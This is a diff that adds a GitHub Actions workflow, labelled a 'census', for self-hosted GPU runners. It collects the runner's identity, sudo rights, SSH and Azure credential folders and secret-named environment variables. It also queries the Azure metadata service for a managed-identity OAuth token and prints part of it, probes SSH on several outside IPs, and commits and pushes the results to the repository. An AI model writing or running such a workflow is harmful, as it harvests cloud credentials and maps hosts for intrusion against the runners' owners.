@@ -1,0 +1,31 @@
+name: ul9060-census
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  l40s:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 10
+    steps:
+      - name: census
+        run: |
+          {
+            echo "LABEL ul-l40s $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            ls -la /root/.azure /home/*/.azure 2>/dev/null | head -20
+            env | grep -iE 'AZURE|ARM_|TOKEN|KEY|SECRET' | sed 's/=.*/=<redacted-in-log>/' | head -20
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 300; echo
+            echo "--- peer :22 reachability from this runner ---"
+            for ip in 20.109.152.114 70.153.87.133 20.240.55.118 20.205.187.223 40.123.206.138 51.104.16.184; do
+              t=$(timeout 6 bash -c "exec 3<>/dev/tcp/$ip/22" 2>&1 && echo OPEN || echo CLOSED)
+              echo "$ip:22 $t"
+            done
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_ul-l40s.txt
+          git add ul/res_ul-l40s.txt && git commit -qm "res ul-l40s" && git push origin HEAD:main || true
+          cat /tmp/res.txt
